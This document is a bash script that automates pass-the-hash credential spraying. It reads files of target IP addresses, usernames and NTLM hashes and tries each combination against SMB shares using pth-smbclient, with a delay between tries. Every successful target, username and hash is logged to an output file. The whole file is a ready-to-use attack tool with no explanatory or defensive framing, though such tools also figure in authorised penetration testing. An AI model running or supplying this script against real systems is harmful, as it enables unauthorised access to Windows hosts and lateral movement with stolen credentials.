TARGETS_FILE=$1
HASHES_FILE=$2
USERNAMES_FILE=$3
TIMEOUT=$4
OUTPUT_FILE=$5

TARGETS=$(cat $TARGETS_FILE | sort -t . -k1,1n -k2,2n -k3,3n -k4,4n | uniq)
USERNAMES=$(cat $USERNAMES_FILE)
HASHES=$(cat $HASHES_FILE)

IS_FIRST_SCAN=0

cat /dev/null > $OUTPUT_FILE

for TARGET in $TARGETS
do
	for USERNAME in $USERNAMES
	do
		echo "Attacking target $TARGET with username $USERNAME"
        	for HASH in $HASHES
        	do
                	if [ $IS_FIRST_SCAN = 0 ]
	                then
        	                IS_FIRST_SCAN=1
                	else
                        	sleep $TIMEOUT
	                fi

        	        RESULT=$(pth-smbclient -U $USERNAME --pw-nt-hash --password=$HASH -L //$TARGET 2>/dev/null | grep -i Share)
                	if [ -z "$RESULT" ]
	                then
        	                continue
                	fi
               
			 echo "$TARGET:$USERNAME:$HASH"
        	         echo "$TARGET:$USERNAME:$HASH" >> $OUTPUT_FILE
                	 break
	        done
	done
       	echo ""
done
